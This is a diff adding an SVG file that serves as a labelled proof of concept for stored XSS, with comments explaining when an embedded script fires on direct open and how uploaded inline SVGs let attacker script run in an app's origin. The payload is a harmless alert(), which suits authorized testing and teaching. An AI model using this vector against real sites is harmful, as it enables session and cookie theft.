@@ -1,0 +1,34 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+  Safe PoC -> x8bitranjit.
+  Benign PoC lab - x8bitranjit style. Authorized security testing only.
+
+  WHAT THIS DEMONSTRATES: Stored/on-view XSS via SVG.
+  WHERE IT FIRES: Opening this file DIRECTLY in a browser (navigation to the
+  .svg URL) - the script executes in the ORIGIN THAT SERVES THE SVG.
+  WHERE IT DOES NOT FIRE:
+    - <img src="this.svg"> - browsers render SVG in <img> in a secure
+      "image mode": scripts do NOT run.
+    - Background-image / CSS references - same image-mode restriction.
+  IMPACT MODEL: if a target lets users upload .svg and serves it inline
+  (Content-Type: image/svg+xml, direct URL), a victim opening the link runs
+  attacker script in the app origin -> document.cookie / actions.
+  Payload is a self-referential alert() only - no exfiltration, no redirect.
+-->
+<svg xmlns="http://www.w3.org/2000/svg" width="640" height="320">
+  <script type="text/javascript">
+    // Benign: self-referential alert only (mirrors xss.html in the lab).
+    alert('Benign SVG XSS PoC - fired on direct open, origin: ' + document.domain);
+  </script>
+  <rect width="640" height="320" fill="#fafafa"/>
+  <text x="24" y="80" font-size="18" font-family="Arial">
+    Safe SVG PoC: script fires when this file is opened directly.
+  </text>
+  <text x="24" y="120" font-size="14" font-family="Arial">
+    If served inline from an app origin, this is stored XSS on open.
+  </text>
+  <text x="24" y="150" font-size="14" font-family="Arial">
+    (Embedded via &lt;img&gt; it would NOT run - browsers sandbox image-mode SVG.)
+  </text>
+  <text x="24" y="185" font-size="13" font-family="Arial">Safe PoC -&gt; x8bitranjit</text>
+</svg>
